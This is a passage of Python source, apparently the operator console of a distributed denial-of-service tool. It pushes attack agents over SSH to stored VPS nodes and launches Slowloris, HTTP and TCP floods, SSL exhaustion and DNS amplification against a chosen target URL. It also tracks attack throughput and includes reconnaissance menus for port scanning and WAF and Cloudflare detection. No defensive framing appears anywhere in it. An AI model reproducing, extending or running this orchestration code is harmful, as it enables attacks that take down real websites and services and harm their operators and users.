        print(f"\n{Colors.BOLD}DEPLOYING AGENTS TO ALL ONLINE VPS{Colors.RESET}")
        print("-" * 50)
        
        # Ask for agent type
        print(f"\n{Colors.BOLD}SELECT AGENT TYPE:{Colors.RESET}")
        print(f"{Colors.GREEN}[1]{Colors.RESET} Standard Agent (Slowloris, Slow POST, Slow Read)")
        print(f"{Colors.GREEN}[2]{Colors.RESET} Advanced Agent (+ HTTP Flood, SSL Exhaust, TCP Flood)")
        
        agent_choice = self.terminal.input_with_prompt("Select agent type [1]: ", False) or "1"
        agent_type = "advanced" if agent_choice == "2" else "standard"
        
        successful_deployments = 0
        for vps in online_vps:
            ip = vps['ip_address']
            print(f"{Colors.CYAN}[DEPLOYING] {ip}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.deploy_agent(ip, agent_type)
            
            if success:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                successful_deployments += 1
            else:
                print(f"{Colors.RED}FAILED - {message}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[SUMMARY] {successful_deployments}/{len(online_vps)} agents deployed successfully{Colors.RESET}")
        input("\nPress Enter to continue...")
    
    def remove_vps(self):
        """Remove a VPS node"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to remove{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}REMOVE VPS NODE{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps['ip_address']} ({vps['location'] or 'Unknown'})")
        
        try:
            choice = self.terminal.input_with_prompt("Select VPS number to remove: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                
                confirm = input(f"{Colors.YELLOW}Remove VPS {vps['ip_address']}? (y/N): {Colors.RESET}").strip().lower()
                
                if confirm == 'y':
                    # Disconnect if connected
                    self.ssh_manager.disconnect_vps(vps['ip_address'])
                    
                    # Remove from database
                    if self.db_manager.remove_vps(vps['ip_address']):
                        print(f"{Colors.GREEN}[SUCCESS] VPS removed{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[ERROR] Failed to remove VPS{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def test_single_vps(self):
        """Test connection to a single VPS node"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TEST SINGLE VPS{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps['ip_address']} ({vps['username']}@{vps['ip_address']}:{vps['ssh_port']})")
        
        try:
            choice = self.terminal.input_with_prompt("Select VPS number: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                ip, username, encrypted_password, port = vps['ip_address'], vps['username'], vps['password'], vps['ssh_port']
                
                print(f"{Colors.CYAN}[TESTING] {ip}...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection established{Colors.RESET}")
                    
                    # Test command execution
                    print(f"{Colors.CYAN}[TESTING] Command execution...{Colors.RESET}")
                    success, output = self.ssh_manager.execute_command(ip, "whoami && pwd && python3 --version")
                    
                    if success:
                        print(f"{Colors.GREEN}[SUCCESS] Command execution successful{Colors.RESET}")
                        print(f"\n{Colors.BOLD}COMMAND OUTPUT:{Colors.RESET}")
                        print(output)
                        
                        # Update status
                        self.db_manager.update_vps_status(ip, 'online', "Connection and command execution successful")
                        
                        # Get system info
                        print(f"\n{Colors.CYAN}[INFO] Gathering system information...{Colors.RESET}")
                        system_info = self.ssh_manager.get_system_info(ip)
                        
                        if system_info:
                            self.db_manager.update_vps_system_info(ip, system_info)
                            
                            print(f"\n{Colors.BOLD}SYSTEM INFORMATION:{Colors.RESET}")
                            for key, value in system_info.items():
                                print(f"  {key.capitalize()}: {value}")
                    else:
                        print(f"{Colors.RED}[ERROR] Command execution failed{Colors.RESET}")
                        print(f"Error: {output}")
                        self.db_manager.update_vps_status(ip, 'online', "Connected but command execution failed")
                else:
                    print(f"{Colors.RED}[ERROR] Connection failed: {message}{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'offline', f"Connection failed: {message[:100]}")
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error testing VPS: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("Press Enter to continue...")
    
    def view_vps_details(self):
        """View VPS details"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}VIEW VPS DETAILS{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps['ip_address']} ({vps['location'] or 'Unknown'})")
        
        try:
            choice = self.terminal.input_with_prompt("Select VPS number: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                
                self.terminal.clear_screen()
                print(f"{Colors.BOLD}VPS DETAILS: {vps['ip_address']}{Colors.RESET}")
                print("=" * 50)
                
                print(f"ID: {vps['id']}")
                print(f"IP Address: {vps['ip_address']}")
                print(f"Username: {vps['username']}")
                print(f"SSH Port: {vps['ssh_port']}")
                print(f"Status: {vps['status']}")
                print(f"Location: {vps['location'] or 'Unknown'}")
                print(f"Created At: {vps['created_at']}")
                print(f"Last Seen: {vps['last_seen'] or 'Never'}")
                
                # System info
                if vps.get('system_info'):
                    try:
                        system_info = json.loads(vps['system_info'])
                        print(f"\n{Colors.BOLD}SYSTEM INFORMATION:{Colors.RESET}")
                        for key, value in system_info.items():
                            print(f"  {key.capitalize()}: {value}")
                    except:
                        print(f"\n{Colors.YELLOW}[WARNING] Could not parse system information{Colors.RESET}")
                
                # Tags
                if vps.get('tags'):
                    try:
                        tags = json.loads(vps['tags'])
                        if tags:
                            print(f"\n{Colors.BOLD}TAGS:{Colors.RESET}")
                            for tag in tags:
                                print(f"  - {tag}")
                    except:
                        pass
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def launch_attack_menu(self):
        """Launch attack menu"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        print(f"{Colors.BOLD}LAUNCH ATTACK{Colors.RESET}")
        print("=" * 50)
        
        # Get online VPS nodes
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps['status'] == 'online']
        
        if not online_vps:
            print(f"{Colors.RED}[ERROR] No online VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        # Display available VPS nodes
        print(f"\n{Colors.BOLD}AVAILABLE VPS NODES:{Colors.RESET}")
        for i, vps in enumerate(online_vps, 1):
            print(f"{i}. {vps['ip_address']} ({vps['location'] or 'Unknown'})")
        
        try:
            # Get attack parameters
            session_name = self.terminal.input_with_prompt("Session Name: ")
            if not session_name:
                return
            
            target_url = self.terminal.input_with_prompt("Target URL (e.g., http://example.com): ")
            if not target_url:
                return
            
            # Add http:// if not present
            if not target_url.startswith('http'):
                target_url = 'http://' + target_url
            
            # Get attack type
            attack_methods = self.attack_manager.get_available_attack_methods()
            print(f"\n{Colors.BOLD}AVAILABLE ATTACK METHODS:{Colors.RESET}")
            for i, (attack_id, attack_name) in enumerate(attack_methods.items(), 1):
                print(f"{i}. {attack_name}")
            
            attack_choice = self.terminal.input_with_prompt("Select attack method (1-8): ")
            if not attack_choice or not attack_choice.isdigit():
                return
            
            attack_idx = int(attack_choice) - 1
            if attack_idx < 0 or attack_idx >= len(attack_methods):
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            attack_type = list(attack_methods.keys())[attack_idx]
            
            # Select VPS nodes
            vps_selection = self.terminal.input_with_prompt("Select VPS nodes (comma-separated numbers, 'all' for all): ")
            if not vps_selection:
                return
            
            selected_vps = []
            if vps_selection.lower() == 'all':
                selected_vps = [vps['ip_address'] for vps in online_vps]
            else:
                try:
                    indices = [int(idx.strip()) - 1 for idx in vps_selection.split(',')]
                    for idx in indices:
                        if 0 <= idx < len(online_vps):
                            selected_vps.append(online_vps[idx]['ip_address'])
                except ValueError:
                    print(f"{Colors.RED}Invalid VPS selection{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
            
            if not selected_vps:
                print(f"{Colors.RED}No VPS nodes selected{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Get attack parameters
            print(f"\n{Colors.BOLD}ATTACK PARAMETERS:{Colors.RESET}")
            
            connections = self.terminal.input_with_prompt("Connections per VPS [100]: ", False) or "100"
            try:
                connections = int(connections)
                if connections < 1:
                    raise ValueError("Connections must be positive")
            except ValueError:
                print(f"{Colors.RED}Invalid connections value{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            duration = self.terminal.input_with_prompt("Attack duration in seconds [300]: ", False) or "300"
            try:
                duration = int(duration)
                if duration < 1:
                    raise ValueError("Duration must be positive")
            except ValueError:
                print(f"{Colors.RED}Invalid duration value{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Additional parameters based on attack type
            parameters = {
                'connections': connections,
                'duration': duration
            }
            
            if attack_type in ['slowloris', 'slow_post', 'slow_read', 'ssl_exhaust']:
                delay = self.terminal.input_with_prompt("Delay between requests in seconds [10]: ", False) or "10"
                try:
                    parameters['delay'] = float(delay)
                except ValueError:
                    print(f"{Colors.RED}Invalid delay value{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
            
            if attack_type == 'http_flood':
                requests = self.terminal.input_with_prompt("Requests per connection [1000]: ", False) or "1000"
                try:
                    parameters['requests'] = int(requests)
                except ValueError:
                    print(f"{Colors.RED}Invalid requests value{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
            
            if attack_type == 'dns_amplification':
                target_ip = self.terminal.input_with_prompt("Target IP address: ")
                if not target_ip or not self.security_manager.validate_ip(target_ip):
                    print(f"{Colors.RED}Invalid IP address{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
                parameters['target_ip'] = target_ip
            
            # Confirm attack
            print(f"\n{Colors.BOLD}ATTACK SUMMARY:{Colors.RESET}")
            print(f"Session Name: {session_name}")
            print(f"Target URL: {target_url}")
            print(f"Attack Type: {attack_methods[attack_type]}")
            print(f"VPS Nodes: {len(selected_vps)}")
            print(f"Connections per VPS: {connections}")
            print(f"Duration: {duration} seconds")
            
            confirm = input(f"\n{Colors.RED}Launch attack? (y/N): {Colors.RESET}").strip().lower()
            
            if confirm == 'y':
                # Create attack session in database
                session_id = self.db_manager.create_attack_session(
                    session_name, target_url, attack_type, selected_vps, parameters
                )
                
                if session_id:
                    # Launch attack
                    success = self.attack_manager.launch_attack(
                        session_id, target_url, attack_type, selected_vps, parameters
                    )
                    
                    if success:
                        print(f"{Colors.GREEN}[SUCCESS] Attack launched successfully{Colors.RESET}")
                        
                        # Ask if user wants to monitor the attack
                        monitor = input(f"\n{Colors.YELLOW}Monitor this attack? (Y/n): {Colors.RESET}").strip().lower()
                        
                        if monitor != 'n':
                            self.monitor_attack(session_id)
                    else:
                        print(f"{Colors.RED}[ERROR] Failed to launch attack{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[ERROR] Failed to create attack session{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error launching attack: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("Press Enter to continue...")
    
    def monitor_attacks_menu(self):
        """Monitor active attacks menu"""
        while self.running:
            self.terminal.clear_screen()
            self.terminal.print_banner(VERSION)
            
            print(f"{Colors.BOLD}ACTIVE ATTACKS{Colors.RESET}")
            print("=" * 50)
            
            active_sessions = self.db_manager.get_active_attack_sessions()
            
            if active_sessions:
                # Convert to list of lists for table printing
                headers = ["ID", "Session Name", "Target", "Attack Type", "VPS", "Started", "Duration"]
                data = []
                
                for session in active_sessions:
                    vps_count = len(session['vps_nodes'].split(',')) if session['vps_nodes'] else 0
                    start_time = session['start_time'][:19] if session['start_time'] else 'N/A'
                    
                    # Calculate duration
                    if session['start_time']:
                        start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
                        duration = (datetime.now() - start).total_seconds()
                        duration_str = f"{int(duration // 60)}m {int(duration % 60)}s"
                    else:
                        duration_str = 'N/A'
                    
                    data.append([
                        session['id'],
                        session['session_name'],
                        session['target_host'] or session['target_url'],
                        session['attack_type'],
                        f"{vps_count} VPS",
                        start_time,
                        duration_str
                    ])
                
                self.terminal.print_table(headers, data)
                
                menu = f"""
{Colors.BOLD}MONITOR OPTIONS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} Monitor Attack
{Colors.GREEN}[2]{Colors.RESET} Stop Attack
{Colors.GREEN}[3]{Colors.RESET} View Attack Details
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-3): {Colors.RESET}"""
                
                print(menu)
                choice = input().strip()
                
                if choice == '1':
                    session_id = self.terminal.input_with_prompt("Enter session ID to monitor: ")
                    if session_id and session_id.isdigit():
                        self.monitor_attack(int(session_id))
                elif choice == '2':
                    session_id = self.terminal.input_with_prompt("Enter session ID to stop: ")
                    if session_id and session_id.isdigit():
                        self.stop_attack(int(session_id))
                elif choice == '3':
                    session_id = self.terminal.input_with_prompt("Enter session ID to view details: ")
                    if session_id and session_id.isdigit():
                        self.view_attack_details(int(session_id))
                elif choice == '0':
                    break
                else:
                    print(f"{Colors.RED}Invalid option{Colors.RESET}")
                    time.sleep(1)
            else:
                print(f"\n{Colors.YELLOW}No active attacks{Colors.RESET}")
                input("Press Enter to continue...")
                break
    
    def monitor_attack(self, session_id):
        """Monitor a specific attack"""
        session = self.db_manager.get_attack_session(session_id)
        
        if not session:
            print(f"{Colors.RED}[ERROR] Attack session not found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        if session['status'] != 'running':
            print(f"{Colors.YELLOW}[WARNING] Attack is not running (status: {session['status']}){Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        vps_list = session['vps_nodes'].split(',') if session['vps_nodes'] else []
        
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}MONITORING ATTACK: {session['session_name']}{Colors.RESET}")
        print(f"Target: {session['target_url']}")
        print(f"Attack Type: {session['attack_type']}")
        print(f"VPS Nodes: {len(vps_list)}")
        print("=" * 50)
        
        print(f"{Colors.YELLOW}Press Ctrl+C to stop monitoring{Colors.RESET}")
        time.sleep(1)
        
        try:
            monitoring = True
            refresh_interval = 2  # seconds
            
            while monitoring:
                self.terminal.clear_screen()
                print(f"{Colors.BOLD}MONITORING ATTACK: {session['session_name']}{Colors.RESET}")
                print(f"Target: {session['target_url']}")
                print(f"Attack Type: {session['attack_type']}")
                print(f"VPS Nodes: {len(vps_list)}")
                
                # Calculate duration
                if session['start_time']:
                    start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
                    duration = (datetime.now() - start).total_seconds()
                    duration_str = f"{int(duration // 3600)}h {int((duration % 3600) // 60)}m {int(duration % 60)}s"
                    print(f"Duration: {duration_str}")
                
                print("=" * 50)
                
                # Get latest results
                results = self.db_manager.get_attack_results(session_id, limit=len(vps_list) * 2)
                
                if results:
                    # Group by VPS
                    vps_results = {}
                    for result in results:
                        vps_ip = result['vps_ip']
                        if vps_ip not in vps_results:
                            vps_results[vps_ip] = []
                        vps_results[vps_ip].append(result)
                    
                    # Display latest result for each VPS
                    headers = ["VPS", "Connections", "Packets", "Bytes", "Errors", "CPU", "Memory", "Status"]
                    data = []
                    
                    for vps_ip, vps_data in vps_results.items():
                        latest = vps_data[0]  # Most recent result first
                        
                        status_str = latest['status']
                        if status_str == 'running':
                            status_str = f"{Colors.GREEN}{status_str}{Colors.RESET}"
                        elif status_str == 'error':
                            status_str = f"{Colors.RED}{status_str}{Colors.RESET}"
                        else:
                            status_str = f"{Colors.YELLOW}{status_str}{Colors.RESET}"
                        
                        data.append([
                            vps_ip,
                            latest['connections_active'],
                            latest['packets_sent'],
                            self._format_bytes(latest['bytes_sent']),
                            latest['error_count'],
                            f"{latest['cpu_usage']:.1f}%" if latest['cpu_usage'] is not None else 'N/A',
                            f"{latest['memory_usage']:.1f}%" if latest['memory_usage'] is not None else 'N/A',
                            status_str
                        ])
                    
                    self.terminal.print_table(headers, data)
                    
                    # Calculate and show totals
                    total_connections = sum(r['connections_active'] for r in results if r['connections_active'] is not None)
                    total_packets = sum(r['packets_sent'] for r in results if r['packets_sent'] is not None)
                    total_bytes = sum(r['bytes_sent'] for r in results if r['bytes_sent'] is not None)
                    total_errors = sum(r['error_count'] for r in results if r['error_count'] is not None)
                    
                    print(f"\n{Colors.BOLD}TOTALS:{Colors.RESET}")
                    print(f"Connections: {total_connections} | Packets: {total_packets} | Data: {self._format_bytes(total_bytes)} | Errors: {total_errors}")
                    
                    # Show response codes if available
                    response_codes = {}
                    for result in results:
                        if result['response_codes']:
                            try:
                                codes = json.loads(result['response_codes'])
                                for code, count in codes.items():
                                    if code not in response_codes:
                                        response_codes[code] = 0
                                    response_codes[code] += count
                            except:
                                pass
                    
                    if response_codes:
                        print(f"\n{Colors.BOLD}RESPONSE CODES:{Colors.RESET}")
                        for code, count in sorted(response_codes.items()):
                            color = Colors.GREEN if code.startswith('2') else Colors.YELLOW if code.startswith('3') else Colors.RED
                            print(f"{color}{code}: {count}{Colors.RESET}", end=" | ")
                        print()
                else:
                    print(f"\n{Colors.YELLOW}No results available yet{Colors.RESET}")
                
                print(f"\n{Colors.YELLOW}Press Ctrl+C to stop monitoring | Refreshing every {refresh_interval}s{Colors.RESET}")
                
                # Check if attack is still running
                updated_session = self.db_manager.get_attack_session(session_id)
                if updated_session['status'] != 'running':
                    print(f"\n{Colors.YELLOW}Attack is no longer running (status: {updated_session['status']}){Colors.RESET}")
                    input("Press Enter to continue...")
                    break
                
                # Wait for refresh interval with check for keyboard interrupt
                try:
                    time.sleep(refresh_interval)
                except KeyboardInterrupt:
                    monitoring = False
                    print(f"\n{Colors.YELLOW}Stopped monitoring{Colors.RESET}")
                    input("Press Enter to continue...")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Stopped monitoring{Colors.RESET}")
            input("Press Enter to continue...")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error monitoring attack: {str(e)}")
            logger.error(traceback.format_exc())
            input("Press Enter to continue...")
    
    def _format_bytes(self, bytes_value):
        """Format bytes to human-readable format"""
        if bytes_value is None:
            return 'N/A'
        
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_value < 1024:
                return f"{bytes_value:.1f} {unit}"
            bytes_value /= 1024
        return f"{bytes_value:.1f} TB"
    
    def stop_attack(self, session_id):
        """Stop an attack"""
        session = self.db_manager.get_attack_session(session_id)
        
        if not session:
            print(f"{Colors.RED}[ERROR] Attack session not found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        if session['status'] != 'running':
            print(f"{Colors.YELLOW}[WARNING] Attack is not running (status: {session['status']}){Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        confirm = input(f"{Colors.RED}Stop attack '{session['session_name']}'? (y/N): {Colors.RESET}").strip().lower()
        
        if confirm == 'y':
            print(f"{Colors.YELLOW}[STOPPING] Sending stop command to all VPS nodes...{Colors.RESET}")
            
            success = self.attack_manager.stop_attack(session_id)
            
            if success:
                print(f"{Colors.GREEN}[SUCCESS] Attack stopped successfully{Colors.RESET}")
            else:
                print(f"{Colors.RED}[ERROR] Failed to stop attack{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def view_attack_details(self, session_id):
        """View attack details"""
        session = self.db_manager.get_attack_session(session_id)
        
        if not session:
            print(f"{Colors.RED}[ERROR] Attack session not found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}ATTACK DETAILS: {session['session_name']}{Colors.RESET}")
        print("=" * 50)
        
        print(f"ID: {session['id']}")
        print(f"Target URL: {session['target_url']}")
        print(f"Target Host: {session['target_host'] or 'N/A'}")
        print(f"Attack Type: {session['attack_type']}")
        print(f"Status: {session['status']}")
        
        # Format timestamps
        start_time = session['start_time'][:19] if session['start_time'] else 'N/A'
        end_time = session['end_time'][:19] if session['end_time'] else 'N/A'
        print(f"Start Time: {start_time}")
        print(f"End Time: {end_time}")
        
        # Calculate duration
        if session['start_time'] and session['end_time']:
            start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
            end = datetime.fromisoformat(session['end_time'].replace('Z', '+00:00'))
            duration = (end - start).total_seconds()
            duration_str = f"{int(duration // 3600)}h {int((duration % 3600) // 60)}m {int(duration % 60)}s"
            print(f"Duration: {duration_str}")
        elif session['start_time'] and session['status'] == 'running':
            start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
            duration = (datetime.now() - start).total_seconds()
            duration_str = f"{int(duration // 3600)}h {int((duration % 3600) // 60)}m {int(duration % 60)}s"
            print(f"Duration: {duration_str} (ongoing)")
        
        # VPS nodes
        vps_list = session['vps_nodes'].split(',') if session['vps_nodes'] else []
        print(f"VPS Nodes: {len(vps_list)}")
        for vps in vps_list:
            print(f"  - {vps}")
        
        # Parameters
        print("\nParameters:")
        try:
            parameters = json.loads(session['parameters']) if session['parameters'] else {}
            for key, value in parameters.items():
                print(f"  {key}: {value}")
        except:
            print("  Unable to parse parameters")
        
        # Results summary
        results = self.db_manager.get_attack_results(session_id)
        if results:
            print("\nResults Summary:")
            total_connections = sum(r['connections_active'] for r in results if r['connections_active'] is not None)
            total_packets = sum(r['packets_sent'] for r in results if r['packets_sent'] is not None)
            total_bytes = sum(r['bytes_sent'] for r in results if r['bytes_sent'] is not None)
            total_errors = sum(r['error_count'] for r in results if r['error_count'] is not None)
            
            print(f"  Total Connections: {total_connections}")
            print(f"  Total Packets: {total_packets}")
            print(f"  Total Data: {self._format_bytes(total_bytes)}")
            print(f"  Total Errors: {total_errors}")
            
            # Response codes
            response_codes = {}
            for result in results:
                if result['response_codes']:
                    try:
                        codes = json.loads(result['response_codes'])
                        for code, count in codes.items():
                            if code not in response_codes:
                                response_codes[code] = 0
                            response_codes[code] += count
                    except:
                        pass
            
            if response_codes:
                print("\nResponse Codes:")
                for code, count in sorted(response_codes.items()):
                    print(f"  {code}: {count}")
        
        # Notes
        if session['notes']:
            print("\nNotes:")
            print(f"  {session['notes']}")
        
        input("\nPress Enter to continue...")
    
    def attack_history_menu(self):
        """Attack history menu"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        print(f"{Colors.BOLD}ATTACK HISTORY{Colors.RESET}")
        print("=" * 50)
        
        sessions = self.db_manager.get_attack_sessions(limit=20)
        
        if sessions:
            # Convert to list of lists for table printing
            headers = ["ID", "Session Name", "Target", "Attack Type", "Status", "Started", "Duration"]
            data = []
            
            for session in sessions:
                start_time = session['start_time'][:19] if session['start_time'] else 'N/A'
                
                # Calculate duration
                if session['start_time'] and session['end_time']:
                    start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
                    end = datetime.fromisoformat(session['end_time'].replace('Z', '+00:00'))
                    duration = (end - start).total_seconds()
                    duration_str = f"{int(duration // 60)}m {int(duration % 60)}s"
                elif session['start_time'] and session['status'] == 'running':
                    start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
                    duration = (datetime.now() - start).total_seconds()
                    duration_str = f"{int(duration // 60)}m {int(duration % 60)}s"
                else:
                    duration_str = 'N/A'
                
                # Format status
                status = session['status']
                if status == 'running':
                    status_str = f"{Colors.GREEN}{status}{Colors.RESET}"
                elif status == 'completed':
                    status_str = f"{Colors.BLUE}{status}{Colors.RESET}"
                elif status == 'failed':
                    status_str = f"{Colors.RED}{status}{Colors.RESET}"
                else:
                    status_str = f"{Colors.YELLOW}{status}{Colors.RESET}"
                
                data.append([
                    session['id'],
                    session['session_name'],
                    session['target_host'] or session['target_url'],
                    session['attack_type'],
                    status_str,
                    start_time,
                    duration_str
                ])
            
            self.terminal.print_table(headers, data)
            
            session_id = self.terminal.input_with_prompt("\nEnter session ID to view details (or Enter to go back): ", False)
            if session_id and session_id.isdigit():
                self.view_attack_details(int(session_id))
        else:
            print(f"\n{Colors.YELLOW}No attack history{Colors.RESET}")
            input("Press Enter to continue...")
    
    def network_tools_menu(self):
        """Network reconnaissance tools menu"""
        while self.running:
            self.terminal.clear_screen()
            self.terminal.print_banner(VERSION)
            
            print(f"{Colors.BOLD}NETWORK RECONNAISSANCE TOOLS{Colors.RESET}")
            print("=" * 50)
            
            menu = f"""
{Colors.BOLD}AVAILABLE TOOLS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} DNS Lookup
{Colors.GREEN}[2]{Colors.RESET} WAF Detection
{Colors.GREEN}[3]{Colors.RESET} Port Scanner
{Colors.GREEN}[4]{Colors.RESET} Cloudflare Detector
{Colors.GREEN}[5]{Colors.RESET} SSL Information
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-5): {Colors.RESET}"""
            
            print(menu)
            choice = input().strip()
            
            if choice == '1':
                self.dns_lookup_tool()
            elif choice == '2':
                self.waf_detection_tool()
            elif choice == '3':
                self.port_scanner_tool()
            elif choice == '4':
                self.cloudflare_detector_tool()
            elif choice == '5':
                self.ssl_info_tool()
            elif choice == '0':
                break
            else:
                print(f"{Colors.RED}Invalid option{Colors.RESET}")
                time.sleep(1)
    
    def dns_lookup_tool(self):
        """DNS lookup tool"""
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}DNS LOOKUP TOOL{Colors.RESET}")
        print("=" * 50)
        
        domain = self.terminal.input_with_prompt("Enter domain name: ")
        if not domain:
            return
        
        print(f"\n{Colors.YELLOW}[INFO] Looking up DNS records for {domain}...{Colors.RESET}")
        
        try:
            results = self.network_tools.lookup_dns_history(domain)
            
            print(f"\n{Colors.BOLD}CURRENT DNS RECORDS:{Colors.RESET}")
            for record_type, records in results['current_records'].items():
                if records:
                    print(f"{Colors.GREEN}{record_type}:{Colors.RESET}")
                    for record in records:
                        print(f"  {record}")
            
            if results['historical_records']:
                print(f"\n{Colors.BOLD}HISTORICAL DNS RECORDS:{Colors.RESET}")
                for record in results['historical_records']:
                    print(f"  {record['date']} - {record['record_type']}: {record['value']}")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error in DNS lookup: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("\nPress Enter to continue...")
    
    def waf_detection_tool(self):
        """WAF detection tool"""
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}WAF DETECTION TOOL{Colors.RESET}")
        print("=" * 50)
        
        target = self.terminal.input_with_prompt("Enter target URL: ")
        if not target:
            return
        
        # Add http:// if not present
        if not target.startswith('http'):
            target = 'http://' + target
        
        print(f"\n{Colors.YELLOW}[INFO] Detecting WAF on {target}...{Colors.RESET}")
        
        try:
            results = self.network_tools.detect_waf(target)
            
            if results['waf_detected']:
                print(f"\n{Colors.GREEN}[DETECTED] WAF detected!{Colors.RESET}")
                print(f"WAF Type: {results['waf_type'] or 'Unknown'}")
                
                print(f"\n{Colors.BOLD}DETECTION EVIDENCE:{Colors.RESET}")
                for evidence in results['evidence']:
                    print(f"  - {evidence}")
            else:
                print(f"\n{Colors.YELLOW}[RESULT] No WAF detected{Colors.RESET}")
                
            if results['cloudflare_detected']:
                print(f"\n{Colors.CYAN}[INFO] Cloudflare protection detected{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error in WAF detection: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("\nPress Enter to continue...")
    
    def port_scanner_tool(self):
        """Port scanner tool"""
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}PORT SCANNER TOOL{Colors.RESET}")
        print("=" * 50)
        
        target = self.terminal.input_with_prompt("Enter target host: ")
        if not target:
            return
        
        # Parse URL if provided
        if target.startswith('http'):
            parsed = urlparse(target)
            target = parsed.hostname or parsed.netloc
        
        port_range = self.terminal.input_with_prompt("Enter port range (e.g., 80,443 or 1-1000): ", False) or "1-1000"
        
